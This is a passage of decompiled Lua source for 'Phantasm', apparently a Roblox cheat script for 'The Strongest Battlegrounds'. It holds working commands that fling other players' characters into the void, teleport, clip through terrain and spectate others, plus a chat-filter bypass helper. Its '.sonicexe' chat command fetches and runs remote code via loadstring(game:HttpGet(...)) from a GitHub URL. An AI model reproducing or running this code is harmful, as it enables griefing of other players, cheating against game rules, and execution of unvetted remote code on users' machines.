                                mobile = UserInputService.TouchEnabled
                            })
                            local up1468 = {}
                            game:GetService("ContentProvider"):PreloadAsync({
                                CoreGui,
                                LocalPlayer.PlayerGui
                            }, function(arg1469, _)
                                local tmp1470 = string.lower(arg1469)
                                local tmp1471 = string.gsub(tmp1470, "rbxassetid://", "")
                                up1468[string.gsub(tmp1471, "rbxasset://", "")] = true
                            end)
                            local tmp1472 = {
                                Goal = "CheckList",
                                List = up1468
                            }
                            communicate(tmp1472)
                            while task.wait() do
                                local tmp1473 = getChar(LocalPlayer)
                                local tmp1474
                                if tmp1473 then
                                    tmp1474 = getHumanoid(tmp1473)
                                else
                                    tmp1474 = tmp1473
                                end
                                if tmp1474 then
                                    local tmp1475, tmp1476, tmp1477 = pairs({
                                        "18169333305",
                                        "18205877704",
                                        "18230909652",
                                        "18230741457",
                                        "17325510002",
                                        "17325513870",
                                        "17325522388",
                                        "17325537719"
                                    })
                                    while true do
                                        local tmp1478
                                        tmp1477, tmp1478 = tmp1475(tmp1476, tmp1477)
                                        if tmp1477 == nil then
                                            break
                                        end
                                        local tmp1479 = Instance.new("Animation")
                                        tmp1479.AnimationId = "rbxassetid://" .. tmp1478
                                        tmp1479.Parent = tmp1473
                                        local tmp1480 = tmp1474:LoadAnimation(tmp1479)
                                        tmp1480:Play()
                                        task.wait()
                                        tmp1480:Stop()
                                    end
                                end
                            end
                        elseif chatMsg.Text:find("^.sonicexe") then
                            sendMsg("exe")
                            getgenv().SonicEXE_Executed = true
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Sonic.lua"))()
                        elseif chatMsg.Text:find("^.fling") then
                            local tmp1481 = tmp1462[1]
                            if tmp1481 then
                                tmp1481 = getPlayer(tmp1462[1])
                            end
                            if tmp1481 then
                                fling(tmp1481.Name)
                            end
                        else
                            local _ = up1455[math.random(1, # up1455)]
                        end
                    end
                end)
            end
            local tmp1483, tmp1484, tmp1485 = pairs(TextChatService.TextChannels:GetChildren())
            while true do
                local tmp1486
                tmp1485, tmp1486 = tmp1483(tmp1484, tmp1485)
                if tmp1485 == nil then
                    break
                end
                tmp1482(tmp1486)
            end
            TextChatService.TextChannels.ChildAdded:Connect(tmp1482)
            worldConnections[# worldConnections + 1] = Players.PlayerRemoving:Connect(function(arg1487)
                if playerConnections[arg1487] then
                    local tmp1488, tmp1489, tmp1490 = pairs(playerConnections[arg1487])
                    while true do
                        local tmp1491
                        tmp1490, tmp1491 = tmp1488(tmp1489, tmp1490)
                        if tmp1490 == nil then
                            break
                        end
                        tmp1491:Disconnect()
                    end
                    if PlayerData.Players[arg1487] then
                        local tmp1492, tmp1493, tmp1494 = pairs(PlayerData.Players[arg1487])
                        while true do
                            local tmp1495
                            tmp1494, tmp1495 = tmp1492(tmp1493, tmp1494)
                            if tmp1494 == nil then
                                break
                            end
                            tmp1495:Remove()
                        end
                        table.remove(PlayerData.Players, table.find(PlayerData.Players, arg1487))
                    end
                    table.clear(playerConnections[arg1487])
                    playerConnections[arg1487] = nil
                    table.remove(playerConnections, table.find(playerConnections, arg1487))
                end
                if table.find(table18, arg1487) then
                    table.remove(table18, table.find(table18, arg1487))
                end
                allplayers = Players:GetPlayers()
            end)
            local function tmp1503(arg1496, arg1497, arg1498)
                connListA[arg1496] = arg1498
                if arg1497 then
                    local tmp1499, tmp1500, tmp1501 = pairs(arg1497)
                    while true do
                        local tmp1502
                        tmp1501, tmp1502 = tmp1499(tmp1500, tmp1501)
                        if tmp1501 == nil then
                            break
                        end
                        connListB[tmp1502] = arg1498
                    end
                end
            end
            local function up1506(arg1504, arg1505)
                (connListA[arg1504] or connListB[arg1504])(arg1505)
            end
            tmp1503("goto", {
                "tp",
                "to"
            }, function(arg1507)
                local tmp1508 = arg1507[1]
                if tmp1508 then
                    tmp1508 = getPlayer(arg1507[1])
                end
                local tmp1509 = getAllPlayers()
                if arg1507[1] and arg1507[1]:lower() == "random" then
                    tmp1508 = tmp1509[math.random(1, # tmp1509)]
                end
                if tmp1508 then
                    local tmp1510 = getChar(tmp1508)
                    local tmp1511
                    if tmp1510 then
                        tmp1511 = getRoot(tmp1510)
                    else
                        tmp1511 = tmp1510
                    end
                    if tmp1510 and tmp1511 then
                        heartbeatTp(tmp1511.CFrame)
                    end
                end
            end)
            tmp1503("say", nil, function(arg1512)
                local tmp1513 = table.concat(arg1512, " ")
                if tmp1513 and not Toggles.DisableMessaging.Value then
                    sendMsg(tmp1513)
                end
            end)
            tmp1503("view", {
                "spectate"
            }, function(arg1514)
                if connListC.view then
                    connListC.view:Disconnect()
                    connListC.view = nil
                end
                local up1515 = arg1514[1]
                if up1515 then
                    up1515 = getPlayer(arg1514[1])
                end
                local tmp1516 = getAllPlayers()
                if arg1514[1] and arg1514[1]:lower() == "random" then
                    up1515 = tmp1516[math.random(1, # tmp1516)]
                end
                if up1515 then
                    UILib:Notify(bypassText("Viewing", up1515.DisplayName), 3, SoundIds.Notification)
                    connListC.view = RenderStepped:Connect(function()
                        local tmp1517 = up1515
                        if tmp1517 then
                            tmp1517 = getChar(up1515)
                        end
                        if up1515 and (up1515.Parent and (tmp1517 and workspace.CurrentCamera)) then
                            workspace.CurrentCamera.CameraSubject = tmp1517
                        elseif up1515 and not up1515.Parent or not up1515 then
                            task.spawn(up1506, "unview")
                        end
                    end)
                end
            end)
            tmp1503("unview", {
                "unspectate"
            }, function(_)
                UILib:Notify(bypassText("Unviewing.."), 3, SoundIds.Notification)
                if connListC.view then
                    connListC.view:Disconnect()
                    connListC.view = nil
                end
                local tmp1518 = getChar(LocalPlayer)
                if tmp1518 and workspace.CurrentCamera then
                    workspace.CurrentCamera.CameraSubject = tmp1518
                end
            end)
            local function up1524(arg1519)
                local tmp1520 = arg1519.Position
                local tmp1521 = tick()
                wait()
                local tmp1522 = arg1519.Position
                local tmp1523 = tick()
                return (tmp1522 - tmp1520) / (tmp1523 - tmp1521)
            end
            local function up1550(arg1525)
                if flag16 or (not Players:FindFirstChild(arg1525) or arg1525 == LocalPlayer.Name) then
                    return
                end
                local otherChar = getChar(LocalPlayer)
                local otherRoot
                if otherChar then
                    otherRoot = getRoot(otherChar)
                else
                    otherRoot = otherChar
                end
                local tmp1528
                if otherChar then
                    tmp1528 = getHumanoid(otherChar)
                else
                    tmp1528 = otherChar
                end
                local tmp1529 = Players[arg1525]
                local tmp1530 = getChar(tmp1529)
                local up1531
                if tmp1530 then
                    up1531 = getRoot(tmp1530)
                else
                    up1531 = tmp1530
                end
                local tmp1532
                if tmp1530 then
                    tmp1532 = getHumanoid(tmp1530)
                else
                    tmp1532 = tmp1530
                end
                if otherChar and (otherRoot and (tmp1528 and (tmp1530 and (up1531 and tmp1532)))) then
                    local tmp1533 = otherRoot.CFrame
                    local tmp1534 = 0
                    flag16 = true
                    local tmp1535 = tick()
                    local tmp1536 = up1531.Position
                    local tmp1537 = table.find(table18, tmp1529)
                    local up1538 = Vector3.new(0, 0, 0)
                    local tmp1539 = true
                    local tmp1540 = Options.FlingSpeed.Value
                    local tmp1541 = Options.FlingTimeout.Value
                    local tmp1542 = Options.FlingType.Value
                    local tmp1543 = tmp1542 == "Anti-Fling" and - 0.75
                    if not tmp1543 then
                        tmp1543 = tmp1542 == "Normal" and 0
                        if not tmp1543 then
                            if tmp1542 == "Void" then
                                tmp1543 = 1
                            else
                                tmp1543 = false
                            end
                        end
                    end
                    while true do
                        if otherRoot and tmp1528 then
                            local tmp1544 = workspace.CurrentCamera
                            if tmp1544 and tmp1544.CameraSubject ~= tmp1532 then
                                tmp1544.CameraSubject = tmp1532
                            end
                            task.spawn(function()
                                up1538 = up1524(up1531)
                            end)
                            tmp1528.PlatformStand = true
                            local tmp1545 = CFrame.new(0, tmp1543, 0) * CFrame.Angles(math.rad(90), 0, math.rad(tmp1534))
                            local tmp1546 = up1531.Position
                            tmp1534 = tmp1534 + tmp1540
                            local tmp1547 = tick()
                            repeat
                                otherRoot.Velocity = Vector3.new(0, - 9000000000, 0)
                                otherRoot.CFrame = CFrame.new(tmp1546) * tmp1545 + tmp1532.MoveDirection * up1531.Velocity.Magnitude / 1.25
                                task.wait()
                            until tick() >= tmp1547 + 0.01
                            otherRoot.CFrame = CFrame.new(tmp1546) * tmp1545 + tmp1532.MoveDirection * ((up1531.Position - tmp1546).Magnitude * 30)
                        end
                        task.wait()
                        if up1531.CFrame.Y >= 10000 or (up1531.CFrame.Y <= - 10000 or ((up1531.Position - tmp1536).Magnitude >= 100 or (up1538.Magnitude >= 250 or (tick() >= tmp1535 + tmp1541 or tmp1529.Character and tmp1529.Character ~= tmp1530)))) or (tmp1539 and tmp1532.Health <= 0 or (tmp1537 and not table.find(table18, tmp1529) or not (tmp1529.Character and LocalPlayer.Character))) then
                            local tmp1548 = workspace.CurrentCamera
                            if tmp1548 then
                                local tmp1549 = not (LocalPlayer.Character and tmp1528) and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                                if tmp1549 then
                                    tmp1549 = LocalPlayer.Character.Humanoid
                                end
                                tmp1548.CameraSubject = tmp1549
                            end
                            while true do
                                if otherRoot then
                                    otherRoot.CFrame = tmp1533
                                    otherRoot.Velocity = Vector3.new()
                                    otherRoot.RotVelocity = Vector3.new()
                                end
                                if tmp1528 then
                                    tmp1528.PlatformStand = false
                                    tmp1528:ChangeState(Enum.HumanoidStateType.GettingUp)
                                end
                                task.wait()
                                if (otherRoot.Position - tmp1533.Position).Magnitude <= 10 and (otherRoot.Velocity.Magnitude >= - 500 and (otherRoot.Velocity.Magnitude <= 500 and not tmp1528.PlatformStand)) or LocalPlayer.Character and LocalPlayer.Character ~= otherChar then
                                    flag16 = false
                                end
                            end
                        end
                    end
                else
                    return
                end
            end
            local function up1556(arg1551)
                if Players:FindFirstChild(arg1551) then
                    local tmp1552 = Players[arg1551]
                    local tmp1553 = tmp1552.Character
                    local tmp1554
                    if tmp1553 then
                        tmp1554 = tmp1553:FindFirstChild("HumanoidRootPart")
                    else
                        tmp1554 = tmp1553
                    end
                    local tmp1555
                    if tmp1553 then
                        tmp1555 = tmp1553:FindFirstChildWhichIsA("Humanoid")
                    else
                        tmp1555 = tmp1553
                    end
                    return tmp1553 and (tmp1554 and (tmp1555 and (tmp1554.CFrame.Y >= 500 or (tmp1554.CFrame.Y <= - 500 or (tmp1555.Health <= 0 or not tmp1552.Character))))) and true or false
                end
            end
            tmp1503("fling", {
                "void"
            }, function(arg1557)
                if not flag17 then
                    if # arg1557 == 1 and (arg1557[1]:lower() == "all" or arg1557[1]:lower() == "others") then
                        table.clear(arg1557)
                        local tmp1558 = Players
                        local tmp1559, tmp1560, tmp1561 = pairs(tmp1558:GetPlayers())
                        while true do
                            local tmp1562
                            tmp1561, tmp1562 = tmp1559(tmp1560, tmp1561)
                            if tmp1561 == nil then
                                break
                            end
                            table.insert(arg1557, tmp1562.Name)
                        end
                    end
                    local tmp1563, tmp1564, tmp1565 = pairs(arg1557)
                    while true do
                        local tmp1566
                        tmp1565, tmp1566 = tmp1563(tmp1564, tmp1565)
                        if tmp1565 == nil then
                            break
                        end
                        local tmp1567 = tmp1566:gsub(",", ""):lower()
                        local tmp1568 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ "
                        local up1569 = ""
                        for tmp1570 = 1, # tmp1567 do
                            local tmp1571 = tmp1567:sub(tmp1570, tmp1570)
                            if tmp1568:find(tmp1571) then
                                up1569 = up1569 .. tmp1571
                            end
                        end
                        task.spawn(function()
                            local tmp1572 = Players
                            local tmp1573, tmp1574, tmp1575 = pairs(tmp1572:GetPlayers())
                            while true do
                                local tmp1576
                                tmp1575, tmp1576 = tmp1573(tmp1574, tmp1575)
                                if tmp1575 == nil then
                                    break
                                end
                                local tmp1577 = tmp1576.Name:lower()
                                local tmp1578 = tmp1576.DisplayName:lower()
                                if tmp1577:find("^" .. up1569) or tmp1578:find("^" .. up1569) then
                                    up1550(tmp1576.Name)
                                    return
                                end
                            end
                        end)
                        if flag16 then
                            repeat
                                task.wait()
                            until not flag16
                        end
                    end
                end
            end)
            tmp1503("loopfling", {
                "loopvoid"
            }, function(arg1579)
                if # arg1579 == 1 and (arg1579[1]:lower() == "all" or arg1579[1]:lower() == "others") then
                    flag17 = true
                    table.clear(arg1579)
                    local tmp1580 = Players
                    local tmp1581, tmp1582, tmp1583 = pairs(tmp1580:GetPlayers())
                    while true do
                        local tmp1584
                        tmp1583, tmp1584 = tmp1581(tmp1582, tmp1583)
                        if tmp1583 == nil then
                            break
                        end
                        table.insert(arg1579, tmp1584.Name)
                    end
                end
                local tmp1585, tmp1586, tmp1587 = pairs(arg1579)
                while true do
                    local tmp1588
                    tmp1587, tmp1588 = tmp1585(tmp1586, tmp1587)
                    if tmp1587 == nil then
                        break
                    end
                    local tmp1589 = tmp1588:gsub(",", ""):lower()
                    local tmp1590 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ "
                    local up1591 = ""
                    for tmp1592 = 1, # tmp1589 do
                        local tmp1593 = tmp1589:sub(tmp1592, tmp1592)
                        if tmp1590:find(tmp1593) then
                            up1591 = up1591 .. tmp1593
                        end
                    end
                    task.spawn(function()
                        local tmp1594 = Players
                        local tmp1595, tmp1596, tmp1597 = pairs(tmp1594:GetPlayers())
                        while true do
                            local tmp1598
                            tmp1597, tmp1598 = tmp1595(tmp1596, tmp1597)
                            if tmp1597 == nil then
                                break
                            end
                            local tmp1599 = tmp1598.Name:lower()
                            local tmp1600 = tmp1598.DisplayName:lower()
                            if (tmp1599:find("^" .. up1591) or tmp1600:find("^" .. up1591)) and not table.find(table18, tmp1598) then
                                table.insert(table18, tmp1598)
                            end
                        end
                    end)
                end
            end)
            tmp1503("unfling", {
                "unvoid",
                "unloopfling",
                "unloopvoid"
            }, function(arg1601)
                if # arg1601 ~= 1 or arg1601[1]:lower() ~= "all" and arg1601[1]:lower() ~= "others" then
                    if flag17 then
                        return
                    end
                else
                    flag17 = false
                    table.clear(arg1601)
                    local tmp1602 = Players
                    local tmp1603, tmp1604, tmp1605 = pairs(tmp1602:GetPlayers())
                    while true do
                        local tmp1606
                        tmp1605, tmp1606 = tmp1603(tmp1604, tmp1605)
                        if tmp1605 == nil then
                            break
                        end
                        table.insert(arg1601, tmp1606.Name)
                    end
                end
                local tmp1607, tmp1608, tmp1609 = pairs(arg1601)
                while true do
                    local tmp1610
                    tmp1609, tmp1610 = tmp1607(tmp1608, tmp1609)
                    if tmp1609 == nil then
                        break
                    end
                    local tmp1611 = tmp1610:gsub(",", ""):lower()
                    local tmp1612 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ "
                    local up1613 = ""
                    for tmp1614 = 1, # tmp1611 do
                        local tmp1615 = tmp1611:sub(tmp1614, tmp1614)
                        if tmp1612:find(tmp1615) then
                            up1613 = up1613 .. tmp1615
                        end
                    end
                    task.spawn(function()
                        local tmp1616 = Players
                        local tmp1617, tmp1618, tmp1619 = pairs(tmp1616:GetPlayers())
                        while true do
                            local tmp1620
                            tmp1619, tmp1620 = tmp1617(tmp1618, tmp1619)
                            if tmp1619 == nil then
                                break
                            end
                            local tmp1621 = tmp1620.Name:lower()
                            local tmp1622 = tmp1620.DisplayName:lower()
                            if (tmp1621:find("^" .. up1613) or tmp1622:find("^" .. up1613)) and table.find(table18, tmp1620) then
                                table.remove(table18, table.find(table18, tmp1620))
                            end
                        end
                    end)
                end
            end)
            task.spawn(function()
                while task.wait() do
                    if # table18 > 0 then
                        local tmp1623, tmp1624, tmp1625 = pairs(table18)
                        while true do
                            local tmp1626
                            tmp1625, tmp1626 = tmp1623(tmp1624, tmp1625)
                            if tmp1625 == nil then
                                break
                            end
                            if # table18 ~= 0 and not up1556(tmp1626.Name) then
                                up1550(tmp1626.Name)
                                if flag16 then
                                    repeat
                                        task.wait()
                                    until not flag16
                                end
                            end
                        end
                    end
                end
            end)
            tmp1503("whitelist", {
                "addwhitelist"
            }, function(arg1627)
                local tmp1628 = arg1627[1]
                if tmp1628 then
                    tmp1628 = getPlayer(arg1627[1])
                end
                if tmp1628 then
                    if table.find(whitelistedPlayers, tmp1628) then
                        UILib:Notify(bypassText("This player is already whitelisted!"), 3, SoundIds.Notification)
                    else
                        table.insert(whitelistedPlayers, tmp1628)
                        UILib:Notify(bypassText("Whitelisted", tmp1628.DisplayName), 3, SoundIds.Notification)
                    end
                end
            end)
            tmp1503("unwhitelist", {
                "removewhitelist"
            }, function(arg1629)
                local tmp1630 = arg1629[1]
                if tmp1630 then
                    tmp1630 = getPlayer(arg1629[1])
                end
                if tmp1630 and table.find(whitelistedPlayers, tmp1630) then
                    table.remove(whitelistedPlayers, table.find(whitelistedPlayers, tmp1630))
                    UILib:Notify(bypassText("Unwhitelisted", tmp1630.DisplayName), 3, SoundIds.Notification)
                end
            end)
            tmp1503("rejoin", {
                "rj"
            }, function(_)
                rejoin()
            end)
            tmp1503("reset", nil, function(_)
                local tmp1631 = getChar(LocalPlayer)
                local tmp1632
                if tmp1631 then
                    tmp1632 = getHumanoid(tmp1631)
                else
                    tmp1632 = tmp1631
                end
                if tmp1631 and tmp1632 then
                    tmp1632:ChangeState(Enum.HumanoidStateType.Dead)
                    tmp1632.Health = 0
                end
            end)
            tmp1503("fixcam", nil, fixCam)
            tmp1503("vclip", nil, function(arg1633)
                local tmp1634 = getChar(LocalPlayer)
                local tmp1635
                if tmp1634 then
                    tmp1635 = getRoot(tmp1634)
                else
                    tmp1635 = tmp1634
                end
                if tmp1634 and (tmp1635 and (arg1633[1] and tonumber(arg1633[1]))) then
                    heartbeatTp(tmp1635.CFrame * CFrame.new(0, arg1633[1], 0))
                end
            end)
            tmp1503("hclip", nil, function(arg1636)
                local tmp1637 = getChar(LocalPlayer)
                local tmp1638
                if tmp1637 then
                    tmp1638 = getRoot(tmp1637)
                else
                    tmp1638 = tmp1637
                end
                if tmp1637 and (tmp1638 and (arg1636[1] and tonumber(arg1636[1]))) then
                    heartbeatTp(tmp1638.CFrame * CFrame.new(0, 0, - arg1636[1]))
                end
            end)
            task.spawn(function()
                local tmp1639 = {
                    Enabled = false,
                    ResetOnSpawn = false,
                    DisplayOrder = 100000,
                    Parent = HiddenGui
                }
                local up1640 = Create("ScreenGui", tmp1639)
                local tmp1641 = Create("Frame", {
                    BackgroundColor3 = Color3.new(0, 0, 0),
                    BorderColor3 = Color3.new(0, 0, 0),
                    Size = UDim2.new(1, - 4, 0, 20),
                    ZIndex = 5,
                    Parent = up1640
                })
                local tmp1642 = Create("Frame", {
                    BackgroundColor3 = Color3.fromRGB(28, 28, 28),
                    BorderColor3 = Color3.fromRGB(50, 50, 50),
                    BorderMode = Enum.BorderMode.Inset,
                    Size = UDim2.new(1, 0, 1, 0),
                    ZIndex = 6,
                    Parent = tmp1641
                })
                Create("UIGradient", {
                    Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(212, 212, 212))
                    }),
                    Rotation = 90,
                    Parent = tmp1642
                })
                local tmp1643 = Create("Frame", {
                    BackgroundTransparency = 1,
                    ClipsDescendants = true,
                    Position = UDim2.new(0, 5, 0, 0),
                    Size = UDim2.new(1, - 5, 1, 0),
                    ZIndex = 7,
                    Parent = tmp1642
                })
                local nameTagLabel = Create("TextLabel", {
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, 0),
                    Size = UDim2.fromScale(5, 1),
                    Font = Enum.Font.Code,
                    Text = "",
                    TextColor3 = Color3.fromRGB(255, 255, 255),
                    TextTransparency = 0.5,
                    TextSize = 14,
                    TextStrokeTransparency = 0.7,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    ZIndex = 7,
                    Parent = tmp1643
                })
                local up1645 = Create("TextBox", {
                    BackgroundTransparency = 1,
                    Position = UDim2.fromOffset(0, 0),
                    Size = UDim2.fromScale(5, 1),
                    Font = Enum.Font.Code,
                    PlaceholderColor3 = Color3.fromRGB(190, 190, 190),
                    PlaceholderText = "",
                    Text = "",
                    TextColor3 = Color3.fromRGB(255, 255, 255),
                    TextSize = 14,
                    TextStrokeTransparency = 0,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    ClearTextOnFocus = true,
                    ZIndex = 8,
                    Parent = tmp1643
                })
                local tmp1646 = up1645
                up1645.GetPropertyChangedSignal(tmp1646, "Text"):Connect(function()
                    if up1645.Text:match("^%s*$") then
                        nameTagLabel.Text = ""
                    else
                        local tmp1647 = up1645.Text:split(" ")
                        if tmp1647 then
                            local tmp1648 = tmp1647[1]
                            if tmp1648 then
                                tmp1648 = tmp1647[1]:lower()
                            end
                            local tmp1649 = tmp1647[2]
                            if tmp1648 then
                                local tmp1650, tmp1651, tmp1652 = pairs(connListA)
                                while true do
                                    local tmp1653
                                    tmp1652, tmp1653 = tmp1650(tmp1651, tmp1652)
                                    if tmp1652 == nil then
                                        break
                                    end
                                    if tmp1652:find("^" .. tmp1648) then
                                        if tmp1649 then
                                            tmp1649 = getPlayer(tmp1649)
                                        end
                                        if tmp1649 then
                                            nameTagLabel.Text = tmp1652 .. "" .. tmp1649.DisplayName
                                            nameTagLabel.Text = up1645.Text .. nameTagLabel.Text:sub(# up1645.Text, # nameTagLabel.Text)
                                        else
                                            nameTagLabel.Text = tmp1652
                                        end
                                    end
                                    local tmp1654, tmp1655, tmp1656 = pairs(connListB)
                                    while true do
                                        local tmp1657
                                        tmp1656, tmp1657 = tmp1654(tmp1655, tmp1656)
                                        if tmp1656 == nil then
                                            break
                                        end
                                        if tmp1656:find("^" .. tmp1648) then
                                            local tmp1658
                                            if tmp1649 then
                                                tmp1658 = getPlayer(tmp1649)
                                            else
                                                tmp1658 = tmp1649
                                            end
                                            if tmp1658 then
                                                nameTagLabel.Text = tmp1656 .. "" .. tmp1658.DisplayName
                                                nameTagLabel.Text = up1645.Text .. nameTagLabel.Text:sub(# up1645.Text, # nameTagLabel.Text)
                                            else
                                                nameTagLabel.Text = tmp1656
                                            end
                                            break
                                        end
                                        nameTagLabel.Text = ""
                                    end
                                end
                            end
                        end
                    end
                end)
                up1645.FocusLost:Connect(function(arg1659)
                    if arg1659 and Toggles.CommandBar.Value and not up1645.Text:match("^%s*$") then
                        nameTagLabel.Text = ""
                        local tmp1660 = up1645.Text:split(" ")
                        if tmp1660 then
                            local tmp1661 = tmp1660[1]
                            if tmp1661 then
                                tmp1661 = tmp1660[1]:lower()
                            end
                            if tmp1661 and (connListA[tmp1661] or connListB[tmp1661]) then
                                table.remove(tmp1660, 1)
                                task.spawn(up1506, tmp1661, tmp1660)
                            end
                        end
                    end
                    up1640.Enabled = false
                end)
                UserInputService.InputBegan:Connect(function(arg1662, _)
                    if not UserInputService:GetFocusedTextBox() and (arg1662.KeyCode == Enum.KeyCode[Options.CommandBind.Value] and Toggles.CommandBar.Value) then
                        up1640.Enabled = true
                        up1645:CaptureFocus()
                        task.spawn(function()
                            repeat
                                up1645.Text = ""
                                nameTagLabel.Text = ""
                                RenderStepped:Wait()
                            until up1645.Text == "" and nameTagLabel.Text == ""
                        end)
                    end
                end)
                if ChatBar then
                    ChatBar.FocusLost:Connect(function(arg1663)
                        if arg1663 then
                            if ChatBar.Text:find("^%s*;") and Toggles.UseCommandsinChat.Value then
                                local tmp1664 = ChatBar.Text:find(";")
                                local tmp1665 = ChatBar.Text:sub(tmp1664 + 1, # ChatBar.Text)
                                if not Toggles.SendCommandInChat.Value then
                                    ChatBar.Text = ""
                                end
                                local tmp1666 = tmp1665:split(" ")
                                if tmp1666 then
                                    local tmp1667 = tmp1666[1]
                                    if connListA[tmp1667] or connListB[tmp1667] then
                                        table.remove(tmp1666, 1)
                                        task.spawn(up1506, tmp1667, tmp1666)
                                    end
                                end
                            elseif Toggles.ChatPrefixEnabled.Value and not Toggles.ChatPrefixEnabled.Disabled then
                                local tmp1668 = ChatBar.Text
                                ChatBar.Text = ""
                                sendMsg(Options.ChatPrefix.Value .. " " .. tmp1668)
                            end
                        end
                    end)
                end
            end)
            UISettingsBox:AddToggle("UnlockMouse", {
                Text = bypassText("Unlock Mouse"),
                Tooltip = bypassText("Unlocks your mouse while the GUI is open."),
                Default = false,
                Callback = function(arg1669)
                    if arg1669 then
                        while task.wait() and Toggles.UnlockMouse.Value ~= false do
                            if not Window.Minimized then
                                local tmp1670 = Instance.new("ScreenGui", HiddenGui)
                                local tmp1671 = Instance.new("TextButton", tmp1670)
                                tmp1671.BackgroundTransparency = 1
                                tmp1671.Size = UDim2.new(0, 0, 0, 0)
                                tmp1671.Text = ""
                                tmp1671.Modal = true
                                repeat
                                    task.wait()
                                until Window.Minimized or Toggles.UnlockMouse.Value == false
                                tmp1670:Destroy()
                            end
                        end
                    end
                end
            })
            local tmp1672 = Tabs["UI Settings"]:AddLeftGroupbox("Menu")
            tmp1672:AddToggle("KeybindMenuOpen", {
                Default = UILib.KeybindFrame.Visible,
                Text = "Open Keybind Menu",
                Callback = function(arg1673)
                    UILib.KeybindFrame.Visible = arg1673
                end
            })
            tmp1672:AddToggle("ShowUntoggledKeybinds", {
                Default = false,
                Text = "Show Untoggled Keybinds"
            })
            tmp1672:AddToggle("ShowCustomCursor", {
                Text = "Custom Cursor",
                Default = true,
                Callback = function(arg1674)
                    UILib.ShowCustomCursor = arg1674
                end
            })
            tmp1672:AddDropdown("NotificationSide", {
                Values = {
                    "Left",
                    "Right"
                },
                Default = "Right",
                Text = "Notification Side",
                Callback = function(arg1675)
                    UILib:SetNotifySide(arg1675)
                end
            })
            tmp1672:AddDropdown("DPIDropdown", {
                Values = {
                    "50%",
                    "75%",
                    "100%",
                    "125%",
                    "150%",
                    "175%",
                    "200%"
                },
                Default = "100%",
                Text = "DPI Scale",
                Callback = function(arg1676)
                    local tmp1677 = arg1676:gsub("%%", "")
                    UILib:SetDPIScale((tonumber(tmp1677)))
                end
            })
            tmp1672:AddDivider()
            tmp1672:AddLabel("Menu Bind"):AddKeyPicker("MenuKeybind", {
                Default = "RightControl",
                NoUI = true,
                Text = "Menu keybind"
            })
            tmp1672:AddButton("Unload", function()
                UILib:Unload()
            end)
            tmp1672:AddButton("Rejoin", rejoin)
            worldConnections[# worldConnections + 1] = RenderStepped:Connect(function()
                if not Toggles.ShowUntoggledKeybinds.Value then
                    local tmp1678 = Options.FlyBind.KeybindsToggle
                    if Toggles.Fly.Value then
                        tmp1678:SetVisibility(true)
                    else
                        tmp1678:SetVisibility(false)
                    end
                    local tmp1679 = Options.AnimeTPKeybind.KeybindsToggle
                    if Toggles.AnimeTeleportation.Value then
                        tmp1679:SetVisibility(true)
                    else
                        tmp1679:SetVisibility(false)
                    end
                    local tmp1680 = Options["L-OnKeybind"].KeybindsToggle
                    if Toggles["Lock-on"].Value then
                        tmp1680:SetVisibility(true)
                    else
                        tmp1680:SetVisibility(false)
                    end
                    local tmp1681 = Options.OrbitBind.KeybindsToggle
                    if Toggles.Orbit.Value then
                        tmp1681:SetVisibility(true)
                    else
                        tmp1681:SetVisibility(false)
                    end
                    local tmp1682 = Options.TP1Bind.KeybindsToggle
                    if Toggles.TP1.Value then
                        tmp1682:SetVisibility(true)
                    else
                        tmp1682:SetVisibility(false)
                    end
                    local tmp1683 = Options.TP2Bind.KeybindsToggle
                    if Toggles.TP2.Value then
                        tmp1683:SetVisibility(true)
                    else
                        tmp1683:SetVisibility(false)
                    end
                    local tmp1684 = Options.VelocitySpoofBind.KeybindsToggle
                    if Toggles.VelocitySpoof.Value then
                        tmp1684:SetVisibility(true)
                    else
                        tmp1684:SetVisibility(false)
                    end
                end
            end)
            UILib.ToggleKeybind = Options.MenuKeybind
            ThemeManager:SetLibrary(UILib)
            SaveManager:SetLibrary(UILib)
            SaveManager:IgnoreThemeSettings()
            SaveManager:SetIgnoreIndexes({
                "MenuKeybind"
            })
            ThemeManager:SetFolder("Phantasm")
            SaveManager:SetFolder("Phantasm/The Strongest Battlegrounds")
            SaveManager:BuildConfigSection(Tabs["UI Settings"])
            ThemeManager:ApplyToTab(Tabs["UI Settings"])
            SaveManager:LoadAutoloadConfig()
            task.spawn(function()
                if LoadingLabel then
                    LoadingLabel.Text = string.format("Loaded in %.1f seconds!", tick() - startTime)
                    task.wait(2)
                    while true do
                        if LoadingLabel then
                            LoadingLabel.Text = LoadingLabel.Text:sub(1, - 2)
                        end
                        task.wait(0.03)
                        if LoadingLabel and LoadingLabel.Text == "" or not LoadingLabel then
                            LoadingLabel.Parent:Destroy()
                        end
                    end
                else
                    return
                end
            end)
            UILib:Notify({
                Title = bypassText("Phantasm"),
                Description = bypassText("Script loaded successfully!"),
                Time = 3,
                SoundId = SoundIds.Notification
            })
        end
    else
        return
    end
end
